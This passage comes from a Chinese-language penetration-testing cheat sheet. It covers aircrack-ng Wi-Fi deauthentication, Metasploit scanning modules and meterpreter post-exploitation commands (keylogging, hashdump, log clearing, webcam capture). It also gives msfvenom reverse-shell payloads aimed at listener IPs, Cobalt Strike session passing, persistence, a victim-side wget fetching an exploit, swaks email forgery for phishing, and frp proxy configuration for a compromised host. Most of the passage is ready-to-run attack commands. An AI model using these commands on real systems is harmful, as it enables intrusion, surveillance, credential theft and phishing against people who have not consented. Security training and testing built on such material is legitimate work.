align="left">airmon-ng</td><td>用于改变无线网卡工作模式，以便其他工具使用</td></tr><tr><td align="left">airodump-ng</td><td>用于捕获802.11数据报文，以便aircrack-ng破解</td></tr><tr><td align="left">airepaly-ng</td><td>在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量</td></tr><tr><td align="left">airserv-ng</td><td>可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备</td></tr><tr><td align="left">aircrack-ng</td><td>主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包,aircrack-ng就可以自动检测数据包并判断是否可以破解</td></tr><tr><td align="left">airolib-ng</td><td>进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件</td></tr><tr><td align="left">airdecap-ng</td><td>用于解开处于加密状态的数据包</td></tr><tr><td align="left">tools</td><td>其他用于辅助的工具，如airdriver-ng、packetforge-ng等</td></tr></tbody></table><p><strong>airmon-ng</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 在已指定信道打开</span><br>airmon-ng stop <span class="hljs-variable">&lt;interface&gt;</span><br>airmon-ng start <span class="hljs-variable">&lt;interface&gt;</span> -c <span class="hljs-variable">&lt;channel&gt;</span><br></code></pre></td></tr></table></figure><p><strong>aircrack-ng</strong></p><p>Attack 0: Deauthentication <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=deauthentication">解除认证</a></p><p>Attack 1: Fake authentication <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=fake_authentication">伪造身份验证</a></p><p>Attack 2: Interactive packet replay <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=interactive_packet_replay">交互式数据包重播</a></p><p>Attack 3: ARP request replay attack <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection">ARP请求重播攻击</a></p><p>Attack 4: KoreK chopchop attack <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=korek_chopchop">KoreK斩杀攻击</a></p><p>Attack 5: Fragmentation attack <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=fragmentation">碎片攻击</a></p><p>Attack 6: Cafe-latte attack <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=cafe-latte">咖啡拿铁攻击</a></p><p>Attack 7: Client-oriented fragmentation attack <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=hirte">面向客户的分片攻击</a></p><p>Attack 8: WPA Migration Mode <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=wpa_migration_mode">WPA迁移模式</a></p><p>Attack 9: Injection test <a href="https://link.jianshu.com/?t=http://www.aircrack-ng.org/doku.php?id=injection_test">注射试验</a></p><p><strong>示例：</strong></p><p><strong>查看网卡基本信息</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">iwconfig</span> wlan0<br>或iw dev<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/fbf6048e2dc0427db13843145e813a52.png" alt="image-20220118103303988"></p><p>若未显示wifi,可在正常的模式下用这个命令扫描wifi，然后再开启airmon-ng开始命令进来就有了，如果还未显示有可能是网卡不支持监听模式，另外还需要注意的是部分网卡对usb3.0存在不兼容现象，可更换2.0端口即可</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 查看无线网卡配置信息，查看支持接口模式</span><br><span class="hljs-attribute">iw</span> list<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/55c9029db9614e79848f9bf55cc7e844.png" alt="image-20220117152020306"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 查看信道</span><br><span class="hljs-attribute">iwlist</span> wlan0 frequency<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/b806b123a73640b78438daec9cd6d647.png" alt="image-20220117152144116"></p><p><strong>Deauth攻击</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment"># 设置网卡为混杂模式</span><br>airmon-ng start wlan0<br>或<br>ifconfig wlan0 down<br>iwconfig wlan0 mode<span class="hljs-built_in"> monitor</span><br><span class="hljs-built_in"></span><span class="hljs-comment">#iwconfig wlan0 mode managed</span><br>iw dev查看状态<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/06cf72bee70b47edbc1bc1a9631fdfa2.png" alt="image-20220118104200947"></p><p>可以看到开启混杂模式，并且重命名为wlan0mon</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 对当前无线网络进行嗅探</span><br>airodump<span class="hljs-punctuation">-</span>ng wlan0<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/c16f47a91be14834a5aac5cc81dd8f71.png" alt="image-20220118103828010"></p><p>使用aircrack-ng进行取消认证攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aireplay</span>-ng -<span class="hljs-number">0</span> &lt;num&gt; -a &lt;BSSID&gt; -c &lt;aim_mac&gt; &lt;interface&gt;<br><span class="hljs-attribute">aireplay</span>-ng -<span class="hljs-number">0</span> <span class="hljs-number">0</span> -a B0:<span class="hljs-number">95</span>:<span class="hljs-number">8</span>E:<span class="hljs-number">28</span>:<span class="hljs-number">0</span>E:<span class="hljs-number">25</span> wlan0<br></code></pre></td></tr></table></figure><h2 id="七、逆向分析"><a href="#七、逆向分析" class="headerlink" title="七、逆向分析"></a>七、逆向分析</h2><h2 id="八、漏洞利用工具集"><a href="#八、漏洞利用工具集" class="headerlink" title="八、漏洞利用工具集"></a>八、漏洞利用工具集</h2><h3 id="1、msf"><a href="#1、msf" class="headerlink" title="1、msf"></a>1、msf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">auxiliary/scanner/discovery/arp_sweep    <span class="hljs-comment">#基于arp协议发现内网存活主机，这不能通过代理使用</span><br>auxiliary/scanner/portscan/ack           <span class="hljs-comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span><br>auxiliary/scanner/portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描，默认扫描1-10000端口</span><br>auxiliary/scanner/discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span><br>auxiliary/scanner/discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span><br>auxiliary/scanner/netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span><br><br>auxiliary/scanner/ftp/ftp_version        <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span><br>auxiliary/scanner/ssh/ssh_version        <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span><br>auxiliary/scanner/telnet/telnet_version  <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span><br>auxiliary/scanner/dns/dns_amp            <span class="hljs-comment">#发现dns服务，基于默认53端口</span><br>auxiliary/scanner/http/http_version      <span class="hljs-comment">#发现内网http服务，基于默认80端口</span><br>auxiliary/scanner/http/title             <span class="hljs-comment">#探测内网http服务的标题</span><br>auxiliary/scanner/smb/smb_version        <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span><br>use auxiliary/scanner/mssql/mssql_schemadump  <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span><br>use auxiliary/scanner/oracle/oracle_hashdump  <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span><br>auxiliary/scanner/mysql/mysql_version    <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span><br>auxiliary/scanner/rdp/rdp_scanner        <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span><br>auxiliary/scanner/redis/redis_server     <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span><br>auxiliary/scanner/db2/db2_version        <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span><br>auxiliary/scanner/netbios/nbname         <span class="hljs-comment">#探测内网主机的netbios名字</span><br></code></pre></td></tr></table></figure><p><strong>常用命令</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs clean"># 监控目标系统键盘输入，停止监控为keyscan_stop<br><br>meterpreter &gt; keyscan_start<br>keyscan_dump <span class="hljs-comment">// 查看键盘记录</span><br><br><br># 将你的Meterpreter移到另一个进程<br># 先用PS命令查看进程后，得到进程ID，然后在执行Migrate （进程ID）<br>meterpreter &gt; migrate<br><br><br># 获取用户的服务器运行<br>meterpreter &gt; getuid<br><br># 进入目标电脑，命令提示符<br>meterpreter &gt; shell<br><br># 目标电脑闲置了多长时间<br>meterpreter &gt; Idletime<br><br><br># 导出对方SAM数据库里的内容,推荐一个hash破解网站：<br># http:<span class="hljs-comment">//www.objectif-securite.ch/products.php</span><br>meterpreter &gt; Hashdump<br><br># 利用已有漏洞，自动提权为SYSTEM<br>meterpreter &gt; getsystem<br><br># 清除事件日志<br>meterpreter &gt; clearev<br><br># 在对方电脑上运行该指令<br>meterpreter &gt; execute（某Windows指令）<br><br>meterpreter &gt; execute <br>Usage: execute -f file [options]<br> <br># 下载文件命令<br>meterpreter &gt; download（文件路径）<br><br>例如下载C盘下面的jzking121.txt文件<br>meterpreter &gt; download c:\\jzking121.txt<br>[*] downloading: c:\jzking121.txt -&gt; jzking121.txt<br>[*] downloaded : c:\jzking121.txt -&gt; jzking121.txt<br># 注意，文件路径中要有两个\\<br># Upload指令跟Download指令类似！<br><br># 关闭目标计算机，reboot为重启计算机<br>meterpreter &gt; shutdown <br><br># 获取目标电脑，屏幕截图<br>meterpreter &gt;screenshot<br><br># 启用目标使用键盘<br>meterpreter &gt; uictl enable keyboard <br># 禁止目标使用鼠标<br>meterpreter &gt; uictl disable mouse   <br><br># 目标系统的摄像头列表<br>meterpreter &gt; webcam_list<br> <br># 从指定的摄像头，拍摄照片<br>meterpreter &gt; webcam_snap<br></code></pre></td></tr></table></figure><p><strong>MSF生成一句话反弹shell</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_awk <span class="hljs-attribute">lhost</span>=1.1.1.1 <span class="hljs-attribute">lport</span>=12345 R<br></code></pre></td></tr></table></figure><p><strong>MSF与CS联动</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata">msf&gt;&gt;<span class="hljs-keyword">cs</span><br>1.先通过msf通过漏洞，进入meterpreter终端：background,建立session会话，用sessions查看session ID及相关信息。<br>2.<span class="hljs-keyword">CS</span>创建一个新的内部监听 设置lhost以及lport<br>3.使用模块 exploit/windows/<span class="hljs-keyword">local</span>/payload_inject ，并设置<br><span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/payload_inject<br><span class="hljs-keyword">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-keyword">set</span> lhost ip     # 创建<span class="hljs-keyword">cs</span>监听的地址<br><span class="hljs-keyword">set</span> lport 60002  # <span class="hljs-keyword">cs</span>监听端口<br><span class="hljs-keyword">set</span> session 1<br>exploit<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">cs&gt;&gt;msf<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.56.105</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 6666</span><br>show <span class="hljs-comment">options</span><br>exploit<br>之后在CS设置监听器，payload设置foreign <span class="hljs-comment">http</span>，设置地址<span class="hljs-comment">192.168.56.105</span>端口<span class="hljs-comment">6666</span><br>通过会话菜单栏spawn(新建会话)，选择监听，发送session<br></code></pre></td></tr></table></figure><p><strong>MSF生成的两种payload</strong></p><p><strong>Stage类型Payload</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br></code></pre></td></tr></table></figure><p>Stage类型payload为分阶段传递payload，payload本身无法反弹shell，当执行payload（即图中shellcode）时，会请求服务器上的第二阶段payload（即图中metsrv），此时Payload就能够反弹Shell，当metsrv传输成功之后，shellcode就会把控制权转给metsrv，metsrv这时再去请求另外两个dll文件stdapi和priv。值得注意的是，Stage型Payload<strong>只能用msf的exploit&#x2F;multi&#x2F;handler模块进行连接</strong>，无法使用nc直接连接。</p><p><img src="https://img-blog.csdnimg.cn/direct/2823e31dbd3a4a798c3041f0be91362b.png" alt="image-20220714205301808"></p><p><strong>Stageless类型Payload</strong></p><p>不分阶段的payload，在生成时已经包含反弹shell所需要metsrv组件，一般体积较大，默认的stageless payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.56.105 <span class="hljs-attribute">LPORT</span>=6666 <span class="hljs-attribute">EXTENSIONS</span>=stdapi,priv -f exe -o stageless.exe<br></code></pre></td></tr></table></figure><p><strong>使用NC连接Payload</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp  <span class="hljs-attribute">LHOST</span>=192.168.56.105 <span class="hljs-attribute">LPORT</span>=6666 -f R<br></code></pre></td></tr></table></figure><p><strong>权限维持</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/local/persistence<br><span class="hljs-built_in">set</span> payload <br><span class="hljs-built_in">set</span> lhost 172.23.88.101<br><span class="hljs-built_in">set</span> lport 6668<br><span class="hljs-built_in">set</span> session 115<br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><strong>将cmdshell升级成meterpreter</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions -u sessionsid</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/herbmint/p/13737051.html">MSF权限维持</a></p><h3 id="2、searchsploit"><a href="#2、searchsploit" class="headerlink" title="2、searchsploit"></a>2、searchsploit</h3><p>功能：Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，利用上面提到的命令就可以查找需要的渗透模块。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式:<br>searchsploit <span class="hljs-selector-attr">[options]</span> term1 <span class="hljs-selector-attr">[term2]</span> ... <span class="hljs-selector-attr">[termN]</span><br>-m,<span class="hljs-attr">--mirror</span> 复制exp至当前目录<br>-<span class="hljs-selector-tag">p</span>,<span class="hljs-attr">--path</span> 显示exp完整路径<br>-u,<span class="hljs-attr">--update</span> 更新exp<br></code></pre></td></tr></table></figure><p><strong>用法&amp;技巧：</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>.查询关键字采取<span class="hljs-built_in">AND</span>运算<br>SearchSploit使用<span class="hljs-built_in">AND</span>运算符，而不是<span class="hljs-built_in">OR</span>运算符。使用的术语越多，滤除的结果越多。<br><span class="hljs-number">2</span>.使用名称搜索时尽量使用全称<br><span class="hljs-number">3</span>.使用“-<span class="hljs-built_in">t</span>”选项<br>默认情况下，searchsploit将检查该漏洞利用的标题以及该路径。根据搜索条件，这可能会导致误报（特别是在搜索与平台和版本号匹配的术语时），使用“-<span class="hljs-built_in">t</span>”选项去掉多余数据。例如searchsploit -<span class="hljs-built_in">t</span> oracle windows显示<span class="hljs-number">7</span>行数据而searchsploitoracle windows |wc –l显示<span class="hljs-number">90</span>行数据。<br><span class="hljs-number">4</span>.在线搜索exploit-db.com中的关键字漏洞<br>searchsploitWarFTP <span class="hljs-number">1.65</span> -w<br><span class="hljs-number">5</span>.搜索微软漏洞<br>搜索微软<span class="hljs-number">2014</span>年的所有漏洞，关键字可以<span class="hljs-symbol">ms14</span>，<span class="hljs-symbol">ms15</span>，<span class="hljs-symbol">ms16</span>，<span class="hljs-symbol">ms17</span><br>searchsploit <span class="hljs-symbol">MS14</span><br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 具体使用：</span><br>searchsploit privilege |<span class="hljs-string"> grep -i linux </span>|<span class="hljs-string"> grep -i kernel </span>|<span class="hljs-string"> grep 2.6</span><br></code></pre></td></tr></table></figure><p>根据文档中具体用法编译</p><p>开启apache2</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">service apache2 <span class="hljs-built_in">restart</span> <br></code></pre></td></tr></table></figure><p>利用wget下载exp</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 受害者</span><br>wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//ip:port</span><br></code></pre></td></tr></table></figure><h2 id="九、社会工程学"><a href="#九、社会工程学" class="headerlink" title="九、社会工程学"></a>九、社会工程学</h2><h3 id="1、swaks"><a href="#1、swaks" class="headerlink" title="1、swaks"></a>1、swaks</h3><p><a href="https://mp.weixin.qq.com/s/wC4LNkGyYptJ3PMK875F2Q">swaks（一） - 伪造邮件</a></p><p>官网：<a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p><p>GitHub：<a href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></p><p>功能：Swaks 是由John Jetmore编写和维护的功能强大、灵活、可编写脚本、面向事务的 SMTP 测试工具。同时对于一名信息安全高级工程师来说也是一个不错的利用工具！它通常被用来伪造邮件，进行钓鱼、社工等操作，</p><p>用法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-t  –to 目标地址 -t   test@test<span class="hljs-selector-class">.com</span><br>-f –from 来源地址 (发件人)  -f <span class="hljs-string">&quot;text&quot;</span><br>–protocol 设定协议(未测试)<br><span class="hljs-attr">--body</span> <span class="hljs-string">&quot;http://www.baidu.com&quot;</span>    <span class="hljs-comment">//引号中的内容即为邮件正文；</span><br><span class="hljs-attr">--header</span> <span class="hljs-string">&quot;Subject:hello&quot;</span>   <span class="hljs-comment">//邮件头信息，subject为邮件标题</span><br>-ehlo 伪造邮件ehlo头<br><span class="hljs-attr">--data</span> ./Desktop/email<span class="hljs-selector-class">.txt</span>    <span class="hljs-comment">//将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</span><br></code></pre></td></tr></table></figure><h1 id="附加工具"><a href="#附加工具" class="headerlink" title="附加工具"></a>附加工具</h1><h3 id="CMSmap"><a href="#CMSmap" class="headerlink" title="CMSmap"></a>CMSmap</h3><p>功能：cms漏洞扫描</p><p>项目地址：<a href="https://github.com/dionach/CMSmap">GitHub</a></p><h3 id="DuckMemoryScan"><a href="#DuckMemoryScan" class="headerlink" title="DuckMemoryScan"></a>DuckMemoryScan</h3><p>功能：内存马检测工具，能查杀绝大多数内存马</p><p>项目地址：<a href="https://github.com/huoji120/DuckMemoryScan.git">GitHub</a></p><h3 id="Ds-store-exp"><a href="#Ds-store-exp" class="headerlink" title="Ds_store_exp"></a><strong>Ds_store_exp</strong></h3><p>.DS_Store文件提取工具</p><p><a href="https://github.com/lijiejie/ds_store_exp">Github</a></p><p><strong>使用方法：</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">pip2 install -r requirements.txt<br>python2 ds_store_exp.<span class="hljs-keyword">py</span> http://www.example.<span class="hljs-keyword">com</span>/.DS_Store<br></code></pre></td></tr></table></figure><h3 id="Frp代理"><a href="#Frp代理" class="headerlink" title="Frp代理"></a>Frp代理</h3><p>功能：高性能反向代理服务器</p><p>msf代理在蚁剑的地方，上传大一点的文件经常会报错，所以使用frp代理稳定一点</p><p><strong>服务器端：</strong></p><p>在kali运行服务端frps，frps.ini配置文件为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span>   <span class="hljs-comment">#kali IP，为与客户端绑定的进行通讯的地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><p>前台启动：<code>./frps -c ./frps.ini</code> 后台启动：<code>nohup ./frps -c ./frps.ini &amp;</code></p><p><img src="https://img-blog.csdnimg.cn/direct/ea340d344bab4c3f9777e2bba7720243.png" alt="image-20220517115911129"><strong>客户端：</strong></p><p>在受害机运行客户端frc，frpc.ini配置文件为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span> <span class="hljs-comment">#服务端的IP地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>           <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> =<span class="hljs-number">8888</span>            <span class="hljs-comment">#socks端口</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure><p>前台启动：<code>./frpc -c ./frpc.ini</code> 后台启动：<code>nohup ./frpc -c ./frpc.ini &amp;</code></p><p><img src="https://img-blog.csdnimg.cn/direct/51df6148fe744ea397ec4743c4fb9f63.png" alt="image-20220517121046202"></p><p><strong>二层代理使用</strong></p><p><strong>网络拓扑:</strong></p><p>攻击机:kali(192.168.56.105)</p><p>受害者:ubuntu20(192.168.56.133)</p><p><img src="https://img-blog.csdnimg.cn/direct/ff27df32fabe4176a7d3a03c064b1e77.png" alt="图片"></p><h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><p><a href="https://github.com/OJ/gobuster">GitHub</a></p><p>常用命令选项</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fw - 使用通配符结果强制处理域。</span><br><span class="hljs-deletion">-np - 隐藏进度输出。</span><br><span class="hljs-deletion">-m &lt;mode&gt;- 使用哪种模式，dir或者dns（默认:) dir。</span><br><span class="hljs-deletion">-q - 禁用横幅/下划线输出。</span><br><span class="hljs-deletion">-t &lt;threads&gt;- 要运行的线程数（默认值:) 10。</span><br><span class="hljs-deletion">-u &lt;url/domain&gt; - 完整URL（包括方案）或基本域名。</span><br><span class="hljs-deletion">-v - 详细输出（显示所有结果）。</span><br><span class="hljs-deletion">-w &lt;wordlist&gt;- 用于暴力强制的wordlist的路径（-用于stdin）。</span><br></code></pre></td></tr></table></figure><p><code>dns</code>模式的命令行选项</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">-<span class="hljs-meta">cn</span> - 显示CNAME记录（不能与<span class="hljs-string">&#x27;-i&#x27;</span>选项一起使用）。<br>-i - 显示结果的所有<span class="hljs-built_in">IP</span>地址。<br></code></pre></td></tr></table></figure><p><code>dir</code>模式的命令行选项</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-a &lt;user agent string&gt; - 指定要在请求标头中发送的用户代理字符串。</span><br><span class="hljs-deletion">-c &lt;http cookies&gt; - 使用它来指定您可能需要的任何cookie（模拟身份验证）。</span><br><span class="hljs-deletion">-e - 指定呈现完整URL的扩展模式。</span><br><span class="hljs-deletion">-f- 附加/目录暴力。</span><br><span class="hljs-deletion">-k - 跳过SSL证书的验证。</span><br><span class="hljs-deletion">-l - 显示响应的长度。</span><br><span class="hljs-deletion">-n - “无状态”模式，禁用结果状态代码的输出。</span><br><span class="hljs-deletion">-o &lt;file&gt; - 指定要将输出写入的文件名。</span><br><span class="hljs-deletion">-p &lt;proxy url&gt; - 指定用于所有请求的代理（方案与URL方案非常匹配）。</span><br><span class="hljs-deletion">-r - 按照重定向。</span><br><span class="hljs-deletion">-s &lt;status codes&gt;- 逗号分隔的状态代码列表集合被视为“正面”（默认值:) 200,204,301,302,307。</span><br><span class="hljs-deletion">-x &lt;extensions&gt; - 要检查的扩展名列表（如果有）。</span><br><span class="hljs-deletion">-P &lt;password&gt; - HTTP授权密码（仅限基本身份验证，如果缺少则提示）。</span><br><span 